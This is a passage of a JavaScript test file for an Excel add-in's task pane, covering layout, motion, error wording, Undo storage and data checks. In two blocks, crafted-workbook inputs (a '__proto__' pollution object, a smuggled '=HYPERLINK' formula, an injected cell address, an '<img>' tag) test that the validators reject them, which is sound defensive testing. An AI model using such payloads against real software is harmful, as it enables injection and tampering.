assert.ok(/class="summary"/.test(skel) && /class="legend"/.test(skel) && /class="flagged-list"/.test(skel) && !/\bid=/.test(skel), "the skeleton: summary, legend, list, and no id a test or script could mistake for the real one");
// AH-157: while a row opens, its card's fix area is the same still bars, never an empty held box: one static block in the
// page with no id, shown by an attribute on the card (pages/fix.js)
const fixSk = /<div class="fix-sk" aria-hidden="true">([\s\S]*?)<\/div>/.exec(html)?.[1] || "";
assert.ok((fixSk.match(/class="sk-bar /g) || []).length >= 2 && !/\bid=/.test(fixSk) && /<div class="fix-body">\s*<div class="fix-sk"/.test(html),
  "the fix card's skeleton: still bars at the top of its fix area, no id");
// AH-157: the last check's line sits under the empty state's heading, never before it (#empty-state p:first-child)
assert.ok(/<section id="empty-state"[^>]*>\s*<p>Click <b>Find problems<\/b>[^<]*<\/p>\s*<p id="last-scan" hidden><\/p>/.test(html), "the empty state's heading stays first, the last check under it");
assert.ok(/toggleAttribute\("data-opening"/.test(readFileSync(new URL("pages/fix.js", import.meta.url), "utf8")), "a row's card shows its skeleton by data-opening while it opens");
assert.ok(!/\bstyle=|<style/.test(html), "the pane CSP refuses inline styles");
// the entrance is unhurried (John: "it seems like I'm rushing the user") and still at rest well inside launch's 2 s
const motion = readFileSync(new URL("components/motion.js", import.meta.url), "utf8");
const [, DUR, STEP, MAX_DELAY] = /const DUR = (\d+), STEP = (\d+), MAX_DELAY = (\d+);/.exec(motion).map(Number);
assert.ok(DUR >= 900 && STEP >= 100 && MAX_DELAY + DUR <= 1600, `entrance ${DUR}/${STEP}/${MAX_DELAY} ms`);
// every new movement has its reduced-motion twin
const css = readFileSync(new URL("styles/components.css", import.meta.url), "utf8");
const calmCss = css.slice(css.lastIndexOf("@media (prefers-reduced-motion: reduce)"));
for (const sel of [".flagged-list button::before", ".flagged-list button:is(:hover, :focus-visible):not(:disabled)", "#scan-skeleton::after", ".fix-sk::after", ".tick::after", "::view-transition-group(*)", "#status::before"])
  assert.ok(calmCss.includes(sel), `no reduced-motion rule for ${sel}`);
assert.ok(/function turnDone\([^)]*\) \{\s*if \(still\(\)/.test(motion), "AH-184: a row turning Fixed skips reduced motion");
// AH-184: Windows High Contrast repaints a background in the page's own colour: the finish line keeps the text colour
assert.ok(css.slice(css.lastIndexOf("@media (forced-colors: active)")).includes("#status::before { forced-color-adjust: none; background: CanvasText; }"), "the finish line stays drawn under High Contrast");
assert.ok(/turnIn\(el, y = null\) \{\s*if \(!el \|\| still\(\)/.test(motion) && /fadeIn\(el\) \{\s*if \(!el \|\| still\(\)/.test(motion), "the page turn and the fade skip reduced motion");
assert.ok(/function morph\([^)]*\) \{\s*if \(!from \|\| still\(\)/.test(motion) && /function stagger\([^)]*\) \{\s*if \(still\(\)\)/.test(motion) && /function countUp\([^)]*\) \{\s*if \(still\(\)\)/.test(motion), "the morph, the rows' arrival and the count skip reduced motion");
// AH-149: every movement is finite. The scan skeleton's light and the progress sliver ran forever ("infinite") while a
// scan ran; each now has a count of its own
for (const [f, src] of [["styles/components.css", css], ["styles/global.css", readFileSync(new URL("styles/global.css", import.meta.url), "utf8")]])
  assert.ok(!/\binfinite\b/.test(src), `${f}: an animation that never ends`);
assert.ok(!/iterations:\s*Infinity/.test(motion), "components/motion.js: an animation that never ends");

// AH-110: Office's and the browser's own words never reach the screen ("Something went wrong:
// InvalidOperationInCellEditMode", "Cannot read properties of undefined (reading 'values')"). The engine's and the network's
// sentences are ours (services/api.js builds them) and are said as they are; Excel's codes get a sentence each; anything
// else one plain sentence with no internal word in it
{
  const { plainError, ours } = await import("./utils/errors.js");
  const quiet = console.error;
  console.error = () => {}; // plainError logs the detail for a person debugging: not this check's output
  try {
    assert.equal(plainError(ours("Arcas has stopped.")), "Something went wrong: Arcas has stopped.");
    assert.equal(plainError(ours("Arcas has stopped."), "Accept failed"), "Accept failed: Arcas has stopped.");
    assert.equal(plainError(Object.assign(new Error("InvalidOperationInCellEditMode"), { code: "InvalidOperationInCellEditMode" })),
      "Excel is busy editing a cell. Press Enter or Esc, then try again.");
    assert.match(plainError(Object.assign(new Error("ItemNotFound"), { code: "ItemNotFound" })), /^The sheet or cells this was about are gone\b.*Find problems/);
    for (const e of [new TypeError("Cannot read properties of undefined (reading 'values')"), new Error("GeneralException"), "x", null,
      Object.assign(new Error("AccessDenied"), { code: "AccessDenied" })]) {
      const said = plainError(e, "Undo failed");
      assert.ok(said.startsWith("Undo failed. ") && !/TypeError|undefined|properties|values|Exception|AccessDenied|null/.test(said), said);
    }
  } finally {
    console.error = quiet;
  }
}

// AH-118: Accept's Undo is kept in the workbook like auto-fix's, so a reload no longer loses the old values. A crafted
// workbook can carry anything under the key: only plain values into plain A1 cells, never a formula, capped
{
  const { asUndos, keepUndo, dropUndo, undoRecord, MAX_UNDOS, MAX_CHARS } = await import("./features/undo-store.js");
  const rec = { sheet: "S", code: "a1.0", before: "b2.0", was: null, cells: [["C11", -5, "General", "5", 5]] };
  assert.deepEqual(asUndos([rec]).map((r) => ({ ...r })), [rec]);
  assert.equal(Object.getPrototypeOf(asUndos([rec])[0]), null, "null-prototype records");
  const bad = JSON.parse('[{"sheet":"S","code":"a1.0","before":"b.0","was":null,"cells":[["C11","=HYPERLINK(\\"x\\")","General","1",1]]},' +
    '{"sheet":"S","code":"a1.0","before":"b.0","was":null,"cells":[["C11; D1",1,"General","1",1]]},' +
    '{"sheet":"S","code":"<img>","before":"b.0","was":null,"cells":[["C11",1,"General","1",1]]},' +
    '{"sheet":"S","code":"a1.0","before":"b.0","was":"admin","cells":[["C11",1,"General","1",1]]},' +
    '{"sheet":"S","code":"a1.0","before":"b.0","was":null,"cells":[["C11",{"x":1},"General","1",1]]},' +
    '{"sheet":"S","code":"a1.0","before":"b.0","was":null,"cells":[]},{"__proto__":{"polluted":1}}, 5, "x"]');
  assert.deepEqual(asUndos(bad), [], "a formula, a crafted address or code, an unknown word, an object or an empty record never survives");
  assert.equal(({}).polluted, undefined);
  for (const junk of [null, "x", 5, {}, { a: 1 }]) assert.deepEqual(asUndos(junk), []);
  let u = keepUndo([], rec);
  u = keepUndo(u, { ...rec, cells: [["C11", -6, "General", "6", 6]] });
  assert.equal(u.length, 1, "the same row kept again replaces its record");
  assert.equal(u[0].cells[0][1], -6);
  assert.deepEqual(dropUndo(u, "S", "a1.0"), []);
  assert.equal(keepUndo([], { ...rec, cells: [["C11", "x".repeat(MAX_CHARS), "General", "5", 5]] }).length, 0, "a record too big to keep is left out");
  let many = [];
  for (let k = 0; k <= MAX_UNDOS; k++) many = keepUndo(many, { ...rec, code: `r${k}.0` });
  assert.equal(many.length, MAX_UNDOS);
  assert.equal(many[0].code, "r1.0", "the oldest goes first");
  // the pane's own Undo record -> what the workbook keeps: never a formula's old value (only memory keeps those)
  const mem = { sheet: "S", code: "a1.0", before: "b2.0", was: "dismissed", changes: [{ cell: "C11", new: "5" }], after: [5],
    writes: [{ cell: "C11", value: -5, format: "General" }] };
  assert.deepEqual({ ...undoRecord(mem) }, { sheet: "S", code: "a1.0", before: "b2.0", was: "dismissed", cells: [["C11", -5, "General", "5", 5]] });
  assert.equal(undoRecord({ ...mem, writes: [{ cell: "C11", value: "=B11*2", format: "General" }] }), null);
}

// AH-117: no negative letter-spacing (John: "negative kerning", a generated page's look) in any pane stylesheet, and no
// small label over a heading that the heading already says (support.html's "Answers" over "Common questions")
const sheetsCss = ["styles/global.css", "styles/components.css", "legal.css"].map((f) => [f, readFileSync(new URL(f, import.meta.url), "utf8")]);
for (const [f, src] of sheetsCss) {
  const neg = /letter-spacing\s*:\s*-[^;}]*/.exec(src);
  assert.ok(!neg, `${f}: "${neg?.[0]}" - letter-spacing is normal or wider, never negative`);
  assert.ok(!/\.(kicker|eyebrow)\b/.test(src), `${f}: an eyebrow class is styled`);
}
for (const f of readdirSync(new URL(".", import.meta.url)).filter((f) => f.endsWith(".html")))
  assert.ok(!/class="[^"]*\b(kicker|eyebrow)\b/.test(readFileSync(new URL(f, import.meta.url), "utf8")), `${f}: an eyebrow label above a heading`);

// AH-120: every kind of button shows it was pressed (only the slider's thumb did). Each class a pane <button> or a page's
// button link wears, the list's row buttons and every details summary have an :active rule
{
  const allCss = sheetsCss.map(([, src]) => src).join("\n");
  const pressed = [...allCss.matchAll(/[^{}]*:active[^{}]*\{/g)].map((m) => m[0]);
  const classes = new Set();
  for (const f of ["taskpane.html", "privacy.html", "support.html"]) {
    const src = readFileSync(new URL(f, import.meta.url), "utf8");
    for (const [, c] of src.matchAll(/<button\b[^>]*\bclass="([^"]+)"/g)) c.split(/\s+/).forEach((x) => classes.add(x));
    for (const [, c] of src.matchAll(/<a\b[^>]*\bclass="(btn[^"]*)"/g)) c.split(/\s+/).forEach((x) => classes.add(x));
  }
  classes.delete("btn"); // the shared frame: its colours live on btn-red / btn-line
  for (const c of [...classes].map((x) => "." + x).concat([".flagged-list button", "#pane-footer .pf-links a"]))
    assert.ok(pressed.some((s) => s.includes(c)), `no :active rule for ${c}: a press shows nothing`);
  // AH-157: a text link shows its press too (a thicker line), in the pane and on its Privacy and Support pages
  for (const [f, src] of sheetsCss.filter(([f]) => f !== "styles/components.css"))
    assert.ok([...src.matchAll(/(^|\})\s*([^{}]*:active)\s*\{/g)].some((m) => m[2].trim() === "a:active"), `${f}: no :active rule for a text link`);
  for (const [f, src] of sheetsCss) if (/summary\s*\{/.test(src))
    assert.ok([...src.matchAll(/[^{}]*:active[^{}]*\{/g)].some((m) => m[0].includes("summary")), `${f}: no :active rule for summary`);
}

// AH-193, the unslop pass (the website's rules on the pane): only transform and opacity ever move (M1): the progress
// bar grew by its width and a button's hover crossfaded its colours, where the site draws a hover across by a scaleX
// layer (M44); decorative hairlines are gold, frames navy (B3); a link is underlined in gold and the main button has no
// tracking of its own, as on the site (P21); the pane opens on its own header and skeleton, its font preloaded (B12)
{
  for (const [f, src] of sheetsCss.filter(([f]) => f.startsWith("styles/")))
    for (const [, v] of src.matchAll(/(?<![-\w])transition\s*:\s*([^;}]+)/g))
      for (const part of v.split(","))
        assert.ok(/^(transform|opacity|none)\b/.test(part.trim()), `${f}: "transition: ${v.trim()}" moves something other than transform or opacity`);
  const g = sheetsCss.find(([f]) => f === "styles/global.css")[1];
  assert.ok(/^h2::before \{[^}]*background: var\(--gold\);/m.test(g), "the hairline over a heading is drawn in gold");
  assert.ok(/\.primary::before, \.secondary::before \{[^}]*transform: scaleX\(0\)/.test(g) && /\.secondary::before \{[^}]*mix-blend-mode: difference/.test(g),
    "a button's hover is a layer drawn across by scaleX, as the website's");
  for (const [f, src] of sheetsCss) {
    for (const [rule] of src.matchAll(/[^{}]*\{[^}]*text-decoration-color\s*:\s*var\(--wine\)/g)) // a fix's new value keeps the wine (B2)
      assert.ok(rule.trim().startsWith(".fix-changes .new {"), `${f}: a link underlined in wine (the site's are gold) - ${rule.trim().slice(0, 60)}`);
    for (const [m] of src.matchAll(/letter-spacing\s*:\s*[^;}]+/g)) assert.ok(/var\(--track\)/.test(m), `${f}: "${m}" - only a table's column heads are tracked`);
  }
  assert.ok(/<link rel="preload" href="assets\/plus-jakarta-sans\.woff2" as="font" type="font\/woff2" crossorigin>/.test(html), "the pane's font is preloaded");
  assert.ok(/<p id="sideload-msg" class="pad" hidden>/.test(html) && /<main id="app-body">/.test(html), "the pane opens on its header and skeleton, never on \"Open this inside Excel.\"");
}

// AH-135, a usability review for a person with few computer skills: the pane's words say what to do in plain steps. The
// engine down names where the file most people have is; the list says its colours change no value and how they go;
// AI help says first that no one needs it; a fix card says what "the source" is
{
  const flat = (s) => s.replace(/<[^>]+>/g, "").replace(/\s+/g, " ").trim();
  const down = flat(/<section id="server-down"[^>]*>([\s\S]*?)<\/section>/.exec(html)?.[1] || "");
  assert.equal(down, "Arcas has stopped. Wait half a minute and press Try again. If that doesn't work, open your Downloads folder, double-click Arcas.exe, then press Try again. Try again", "the engine down at start");
  assert.ok(readFileSync(new URL("services/api.js", import.meta.url), "utf8").includes('throw ours("Arcas has stopped. Wait half a minute and try again. If that doesn\'t work, open your Downloads folder, double-click Arcas.exe, then try again.")'), "the engine down mid-call");
  assert.ok(/<p id="list-hint" class="hint">[^<]*The cells to check are coloured in your sheet\. This changes no values\. Remove highlights takes the colour off\.<\/p>/.test(html), "the list's hint does not say what the colours are");
  assert.ok(html.includes('<button id="clear-highlights" class="secondary">Remove highlights</button>'), "the hint names a button that is not there");
  assert.ok(/<summary>AI help \(optional, free\)<\/summary>\s*<p class="hint">Optional\. Arcas finds problems without AI\.<\/p>/.test(html), "AI help does not open by saying it is optional");
  assert.ok(readFileSync(new URL("features/fix.js", import.meta.url), "utf8").includes("Check it against the original receipt, invoice or report before you click Accept."), "a fix card's check against the source");
}

// AH-175: the pane simpler on first use: the slider, its hint and how it was tested fold under Find problems, closed, the
// summary saying the level
{
  const level = /<details id="strength-box" class="more"[^>]*>\s*<summary>(.*?)<\/summary>([\s\S]*?)<\/details>\s*<\/div>\s*<button id="undo-auto"/.exec(html);
  assert.ok(level && level[1].replace(/<[^>]+>/g, "") === "How hard to look: 5 of 10" && /id="strength-val"/.test(level[1]) && /id="strength"/.test(level[2])
    && /id="strength-hint"/.test(level[2]) && /id="strength-tested"/.test(level[2]) && !/<details id="strength-box"[^>]*\bopen\b/.test(html), "the slider folded, closed, under a summary naming the level");
}
// AH-175: Ask AI folds under a card's fix, closed. What a card says (its status, a failure, the helpline message) stays
// outside the fold, never hidden in it
{
  const ask = /<details id="ai-fold" class="more">\s*<summary>Want a different fix\? Ask AI<\/summary>\s*<div id="ai-box">([\s\S]*?)<\/div>\s*<\/details>\s*<p id="ai-off"/.exec(html);
  assert.ok(ask && ["fix-intent", "fix-tries", "fix-ask", "fix-sends"].every((id) => ask[1].includes(`id="${id}"`)) && !["fix-care", "fix-status", "fix-changes"].some((id) => ask[1].includes(`id="${id}"`)),
    "Ask AI folded on the card, its status, failures and helpline message outside the fold");
}

// AH-180: a student copied 3 series onto 3 tabs and pasted series 2 again on the third. A column counts as a measure only
// with 10+ numbers, 5+ different values, neither rising nor falling all the way (a time axis, an ID) and at most half of
// its numbers formulas (=Series2!B2 is a copy by design). Each edge both ways
{
  const tab = (sheet, cols, calc) => ({ sheet, columns: cols.map((_, j) => `c${j}`), rows: cols[0].map((_, i) => cols.map((c) => c[i])), calc });
  const wave = (k, len = 12) => Array.from({ length: len }, (_, i) => Math.round(100 * Math.sin(i * 1.3 + k)) / 10);
  const time = Array.from({ length: 12 }, (_, i) => i);
  assert.deepEqual(measures(tab("A", [time, wave(1)])), [wave(1)], "a time axis is no measure");
  assert.deepEqual(measures(tab("A", [time.map((v) => -v), wave(1)])).length, 1, "nor one that only falls");
  const once = [9, ...time.slice(1)]; // rising all the way but its first step
  assert.deepEqual(measures(tab("A", [once])), [once], "a column that breaks its rise once is a measure");
  assert.equal(measures(tab("A", [wave(1, 10)])).length, 1, "10 numbers are enough");
  assert.equal(measures(tab("A", [wave(1, 9)])).length, 0, "9 are not");
  assert.equal(measures(tab("A", [[1, 2, 3, 4, 5, 1, 2, 3, 4, 5]])).length, 1, "5 different values are enough");
  assert.equal(measures(tab("A", [[1, 2, 3, 4, 1, 2, 3, 4, 1, 2]])).length, 0, "4 are not");
  assert.equal(measures(tab("A", [[...wave(1, 10), "n/a", "", true]])).length, 1, "text and blanks are skipped");
  const made = (k) => Array.from({ length: 10 }, (_, i) => [i < k ? "=RC[-1]" : null]);
  assert.equal(measures(tab("A", [wave(1, 10)], made(5))).length, 1, "half its numbers formulas: still a measure");
  assert.equal(measures(tab("A", [wave(1, 10)], made(6))).length, 0, "more than half: a copy by design");
  // the student's case: tab 3 has its own header over series 2's numbers
  const s1 = tab("Series 1", [time, wave(1)]), s2 = tab("Series 2", [time, wave(2)]), s3 = { ...tab("Series 3", [time, wave(2)]), columns: ["Seconds", "Response"] };
  assert.deepEqual(copiedTabs([s1, s2, s3]), [{ sheet: "Series 3", other: "Series 2", columns: 1, count: 12 }]);
  assert.deepEqual(copiedTabs([s1, s2, tab("Series 3", [time, wave(3)])]), [], "a shared time column alone is no copy");
  const age = wave(9);
  assert.deepEqual(copiedTabs([tab("A", [age, wave(1)]), tab("B", [age, wave(2)])]), [], "one shared column beside others that differ is no copy");
  assert.deepEqual(copiedTabs([tab("A", [wave(1), wave(2)]), tab("B", [wave(3)]), tab("C", [wave(2), wave(1)])]), [{ sheet: "C", other: "A", columns: 2, count: 24 }],
    "three tabs: the later one paired with the one it copies, its columns in any order");
  assert.deepEqual(copiedTabs([tab("A", [time]), tab("B", [time])]), [], "no measure, no copy");
  assert.deepEqual(copiedTabs([{ sheet: "A", measured: [wave(1)] }, tab("B", [wave(1)])]).map((p) => p.other), ["A"], "a tab's measures read before are used as they are");
  assert.equal(copiedSaid({ sheet: "Series 3", other: "Series 2", columns: 1, count: 1200 }),
    '"Series 3" holds the same 1,200 numbers as "Series 2", in the same order. If you meant to paste a different series there, the same one went in twice.');
  assert.equal(copiedSaid({ sheet: "B", other: "A", columns: 2, count: 24 }),
    '"B" holds the same 24 numbers as "A", in 2 columns, in the same order. If you meant to paste a different series there, the same one went in twice.');
  // a sheet whose data ends on Excel's last row (or the old one's) was likely cut off when it opened
  assert.equal(lastRowSaid(1048576), "This sheet's data reaches Excel's last row (1,048,576). If it came from a bigger file, the rows past it were cut off when it opened.");
  assert.equal(lastRowSaid(65536), "This sheet's data reaches Excel's last row (65,536). If it came from a bigger file, the rows past it were cut off when it opened.");
  for (const last of [65535, 1048575, 300, undefined]) assert.equal(lastRowSaid(last), "");
}

// AH-181: check as you work. An edit our own write made, or one from another person's copy, is never checked; a sheet
// past LIVE_ROWS rows is not checked as you type; both switches are on unless turned off; a finding is new only in a cell
// that was changed and not already found there for the same reason
{
  assert.equal(ignored({ source: "Local", triggerSource: "ThisLocalAddin" }, false), true, "our own write");
  assert.equal(ignored({ source: "Remote", triggerSource: "Unknown" }, false), true, "a co-author's edit");
  assert.equal(ignored({ source: "Local", triggerSource: "Unknown" }, true), true, "while a scan, Accept or Undo runs");
  assert.equal(ignored({ source: "Local", triggerSource: "Unknown" }, false), false, "the user's own edit");
  assert.equal(ignored({ source: "Local" }, false), false, "the user's edit in an Excel older than 1.14 (no triggerSource)");
  assert.equal(LIVE_ROWS, 20000);
  assert.equal(liveable(20000), true);
  assert.equal(liveable(20001), false);
  const box = new Map();
  globalThis.localStorage = { getItem: (k) => box.get(k) ?? null, setItem: (k, v) => box.set(k, String(v)), removeItem: (k) => box.delete(k) };
  assert.ok(liveOn() && soundOn(), "on unless turned off");
  box.set(K.LIVE_KEY, "0"); box.set(K.SOUND_KEY, "0");
  assert.ok(!liveOn() && !soundOn(), "off once turned off");
  box.set(K.LIVE_KEY, "1");
  assert.ok(liveOn());
  globalThis.localStorage = { getItem() { throw new Error("off"); } };
  assert.ok(liveOn() && soundOn(), "no storage: on");
  delete globalThis.localStorage;
  for (const [a, cell, at] of [["B12", "B12", true], ["B2:B41", "B30", true], ["B2:B41", "C30", false], ["Series 3!$B$2:$B$41", "B41", true], ["B2:B41", "B42", false],
    ["A1:B2, D4", "D4", true], ["C:C", "C9000", true], ["5:7", "Z6", true], ["5:7", "Z8", false], [undefined, "A1", false]]) assert.equal(inRange(a, cell), at, `${a} ${cell}`);
  const s = { columns: ["Item", "Units"], startRow: 0, startCol: 0, names: {} };
  const rows = [{ severity: null }, { severity: "Medium", magnitude: 2, cells: ["Units"], reason: "Units weird limit is 90; this is 900 (likely 90)" },
    { severity: "High", magnitude: 1, cells: ["Units"], reason: "Units weird limit is 90; this is -5 (likely 5)" },
    { severity: "Low", magnitude: 9, cells: ["Item"], reason: "Item is odd" }, { severity: "Medium", magnitude: 5, cells: ["Units"], reason: "Units weird limit is 90; this is 9000" }];
  // sheet rows: row i is sheet row i + 2 (the header on row 1)
  assert.deepEqual(findingsAt(rows, s, {}, ["B3:B6"]).map((f) => f.cell), ["B4", "B6", "B3"], "surest first, then biggest");
  assert.deepEqual(findingsAt(rows, s, {}, ["B3:B4"]).map((f) => f.cell), ["B4", "B3"], "only in the cells changed");
  assert.deepEqual(findingsAt(rows, s, { 2: "dismissed" }, ["B3:B6"]).map((f) => f.cell), ["B6", "B3"], "never a row fixed or dismissed");
  assert.deepEqual(findingsAt(rows, s, {}, ["A5"]).map((f) => f.cell), ["A5"]);
  assert.equal(noteSaid("Series 3", findingsAt(rows, s, {}, ["B4"])[0], 0, {}), 'Sheet "Series 3", cell B4: Very likely wrong. Units is -5, below its usual limit of 90 (likely 5).');
  const two = [{ severity: "Medium", magnitude: 1, cells: ["Units", "Item"], reason: "Item 7 does not add up: Units × 2 = 1800; Units weird limit is 90; this is 900" }];
  assert.equal(noteSaid("Sales", findingsAt(two, s, {}, ["B2"])[0], 0), 'Sheet "Sales", cell B2: Probably wrong. Units is 900, above its usual limit of 90.', "the line about the changed cell");
  assert.equal(noteSaid("Sales", findingsAt(two, s, {}, ["A2"])[0], 0), 'Sheet "Sales", cell A2: Probably wrong. Item 7 does not add up: Units × 2 = 1800.');
  assert.equal(checkedSaid("Series 3", ["B12"]), 'Checked B12 on "Series 3": nothing unusual.');
  assert.equal(checkedSaid("Series 3", ["B2:B500"]), 'Checked B2:B500 on "Series 3": nothing unusual.');
  assert.equal(checkedSaid("S", ["A1", "B2", "A1", "C3", "D4", "E5"]), 'Checked A1, B2, C3 and 2 more on "S": nothing unusual.', "each address once, 3 named");
  assert.equal(noteSaid("Sales", findingsAt(rows, s, {}, ["B3"])[0], 3, {}), 'Sheet "Sales", cell B3: Probably wrong. Units is 900, above its usual limit of 90 (likely 90). And 3 more in what you changed.');
}


// AH-205: a Dismiss teaches the sheet the values its one-cell checks named, as codes, never the values; "Stop checking"
// keeps [kind, column]; both turned back into the /scan's `learned` from the sheet itself, capped as the engine takes it
{
  const s = { columns: ["Glass", "Units", "Total"], rows: [["Highball Glass", 7777, 10], ["Highball glass", 5, 10], ["Highball Glass", 7777, 1234.5], ["", 5, 10]] };
  const kinds = [["spelling", "Glass"], ["limits", "Units"], ["sum", "Total"], ["blank", "Glass"], ["limits", null]];
  const pairs = taught(kinds, s.columns, s.rows[0]);
  assert.deepEqual(pairs, [["Glass", hash("Highball Glass")], ["Units", hash("7777")]], "only the one-cell checks of a value teach: never a sum, a blank, a column-less reason");
  assert.ok(!JSON.stringify(pairs).includes("Highball") && !JSON.stringify(pairs).includes("7777"), "codes, never the values");
  assert.deepEqual(taught([["spelling", "Glass"]], s.columns, s.rows[3]), [], "a blank is never learned");
  assert.deepEqual(taught([["spelling", "Glass"]], s.columns, ["x".repeat(TEXT + 1)]), [], "nor a value longer than the engine takes");
  assert.deepEqual(taught([["spelling", "Glass"]], s.columns, ["x".repeat(TEXT)]).length, 1, "one at the very limit is");
  assert.deepEqual(learnedOf(s, pairs, []), { accept: [["Glass", "Highball Glass"], ["Units", "7777"]], ignore: [] }, "each code back to the value it was made from, once");
  assert.equal(learnedOf(s, [], []), null, "nothing learned: nothing sent");
  assert.equal(learnedOf({ columns: ["Units"], rows: [[5]] }, pairs, []), null, "a value no longer in the sheet is not sent");
  assert.deepEqual(learnedOf(s, [], [["limits", "Units"], ["limits", "Gone"]]), { accept: [], ignore: [["limits", "Units"]] }, "a column no longer in the sheet is not sent");
  const many = { columns: ["V"], rows: Array.from({ length: SENT + 1 }, (_, k) => [`v${k}`]) };
  assert.equal(learnedOf(many, many.rows.map(([v]) => ["V", hash(v)]), []).accept.length, SENT, "at most what the engine takes");
  assert.deepEqual(stoppable([["limits", null], ["spelling", "Glass"]]), ["spelling", "Glass"]);
  assert.equal(stoppable([["nonsense", "Glass"]]), null);
  assert.equal(stoppable(undefined), null);
  assert.ok([...ONE_CELL].every((k) => KIND_WORDS[k]) && !["sum", "order", "date_order", "record", "balance", "duplicate", "formula", "blank", "key"].some((k) => ONE_CELL.has(k)),
    "a one-cell check never silences a row's arithmetic, an order, a record, a formula, a duplicate or a blank");
  // the book: once each, newest last, capped, a sheet named __proto__ kept apart; a crafted workbook's junk dropped
  let book = learnIn(Object.create(null), "S", [["A", "abc"], ["A", "abc"]]);
  assert.deepEqual(book.S, [["A", "abc"]]);
  book = learnIn(book, "S", [["A", "abc"]], true);
  assert.ok(!("S" in book), "Undo of a Dismiss takes out what it taught");
  book = learnIn(Object.create(null), "S", Array.from({ length: LEARN_CAP + 1 }, (_, k) => ["A", k.toString(36)]));
  assert.equal(book.S.length, LEARN_CAP, "capped per sheet");
  const junk = asLearned({ __proto__: [["A", "abc"]], S: [["A", "abc"], ["A", 7], [1, "x"], "x", ["A", "b", "c"]], T: "x" }, (x) => typeof x === "string", (c) => typeof c === "string");
  assert.deepEqual(Object.keys(junk), ["S"]);
  assert.deepEqual(junk.S, [["A", "abc"]]);
}

// AH-203: the 16 and 32 px icons (ribbon, favicon, the exe's) are the mark's coin, read pixel by pixel: round (its corners
// empty), every row its own mirror image, the gold only in the ring (the A has no gold tile), and the A's rows in the true
// wine and navy; at 16 px every pixel is one of the coin's colours (it is placed pixel by pixel)
{
  const rgba = (file) => { // an 8-bit RGB or RGBA PNG, as Chromium writes it (RGB when every pixel is opaque)
    const b = readFileSync(new URL(file, import.meta.url)), w = b.readUInt32BE(16), h = b.readUInt32BE(20), parts = [];
    assert.ok(b[24] === 8 && (b[25] === 2 || b[25] === 6) && b[28] === 0, `${file}: not an 8-bit RGB or RGBA PNG`);
    const n = b[25] === 6 ? 4 : 3;
    for (let i = 8; i < b.length; i += 12 + b.readUInt32BE(i)) if (b.toString("latin1", i + 4, i + 8) === "IDAT") parts.push(b.subarray(i + 8, i + 8 + b.readUInt32BE(i)));
    const raw = inflateSync(Buffer.concat(parts)), out = Buffer.alloc(w * h * n), row = w * n;
    for (let y = 0; y < h; y++) for (let x = 0; x < row; x++) {
      const f = raw[y * (row + 1)], v = raw[y * (row + 1) + 1 + x], a = x >= n ? out[y * row + x - n] : 0, up = y ? out[(y - 1) * row + x] : 0, c = x >= n && y ? out[(y - 1) * row + x - n] : 0;
      const p = a + up - c, pr = Math.abs(p - a) <= Math.abs(p - up) && Math.abs(p - a) <= Math.abs(p - c) ? a : Math.abs(p - up) <= Math.abs(p - c) ? up : c;
      out[y * row + x] = (v + [0, a, up, (a + up) >> 1, pr][f]) & 255;
    }
    return { w, h, px: (x, y) => [...out.subarray((y * w + x) * n, (y * w + x) * n + 3), n === 4 ? out[(y * w + x) * n + 3] : 255] };
  };
  const hex = (p) => "#" + p.slice(0, 3).map((v) => v.toString(16).padStart(2, "0")).join("").toUpperCase();
  const STEPS = ["#6B1E2E", "#5B1E30", "#4B1C35", "#371C3A", "#211B3C", "#0C1938"], GOLD = "#997D3A";
  for (const n of [16, 32]) {
    const { w, h, px } = rgba(`assets/crest4-${n}.png`), c = w / 2, seen = new Set();
    for (const [x, y] of [[0, 0], [w - 1, 0], [0, h - 1], [w - 1, h - 1]]) assert.equal(px(x, y)[3], 0, `crest4-${n}.png: a corner is not empty`);
    for (let y = 0; y < h; y++) for (let x = 0; x < w; x++) {
      const p = px(x, y), q = px(n === 16 ? w - 1 - x : w - 1 - x, y);
      if (n === 16) assert.deepEqual(p, q, `crest4-16.png: row ${y} is not its own mirror image`);
      if (p[3] === 255) seen.add(hex(p));
      if (hex(p) === GOLD && p[3] === 255) assert.ok(Math.hypot(x + 0.5 - c, y + 0.5 - c) > c * 0.75, `crest4-${n}.png: gold inside the ring at ${x},${y}`);
    }
    assert.ok(seen.has(GOLD) && seen.has(STEPS[0]) && seen.has(STEPS[5]), `crest4-${n}.png: no gold ring, wine top or navy foot`);
    if (n === 16) assert.deepEqual([...seen].filter((k) => k !== GOLD && k !== "#EEE9DD" && !STEPS.includes(k)), [], "crest4-16.png: a pixel outside the coin's colours");
  }
}

// AH-203: on navy (the pane's header and footer, its privacy and support pages) no box round the mark: John, "no white box
// in the Excel pane header or footer ... visible at 100%". The mark is its paper coin in a gold ring (crest4-coin.svg): the
// tiles in their true steps, wine to navy (tints drawn for navy read "way too bright"), a gold ring, no square plate; the
// header draws it inline (its ring sweeps once) and every other place shows the file, never a paper icon
{
  const STEPS = ["#6B1E2E", "#5B1E30", "#4B1C35", "#371C3A", "#211B3C", "#0C1938"];
  const coin = readFileSync(new URL("assets/crest4-coin.svg", import.meta.url), "utf8");
  const tiles = [...coin.matchAll(/data-part="tile" data-row="(\d)"[^>]*fill="(#[0-9A-F]{6})"/g)];
  assert.ok(tiles.length === 14 && tiles.every(([, r, f]) => f === STEPS[+r]), "crest4-coin.svg: not 14 tiles in their true steps, wine to navy");
  assert.ok(/data-part="ring"[^>]*stroke="#997D3A"/.test(coin) && /data-part="disc"/.test(coin) && !/<rect\b(?![^>]*height="31")[^>]*fill="#F7F5F0"/.test(coin), "crest4-coin.svg: no gold ring or disc, or a square plate");
  const pane = readFileSync(new URL("taskpane.html", import.meta.url), "utf8");
  const head = /<span class="mark">(<svg class="coin"[\s\S]*?<\/svg>)<\/span>/.exec(pane);
  assert.ok(head && head[1].replace(/^<svg [^>]*>/, "") === coin.trim().replace(/^<svg [^>]*>/, ""), "taskpane.html: the header's mark is not crest4-coin.svg");
  for (const page of ["taskpane.html", "privacy.html", "support.html"]) {
    const html = readFileSync(new URL(page, import.meta.url), "utf8").replace(/<link[^>]*>/g, "");
    assert.ok(!/crest4-(16|32|64|80)\.png/.test(html), `${page}: a paper icon on the navy band (a white box)`);
  }
}

// AH-212: a power user's sheet is seldom one table. The layout reader finds each table: a small one above the main one,
// a header of two rows (Jan, Feb, Mar under a merged Costs), a label merged down its group, subtotal and notes rows sent
// blank (the engine's summary_rows skips a blank row), a table beside it past a blank column, a table stacked below past
// blank rows, and it names the cells that hold no table
{
  const W = 9, row = (...v) => [...v, ...Array(W - v.length).fill("")], none = () => Array(W).fill(null);
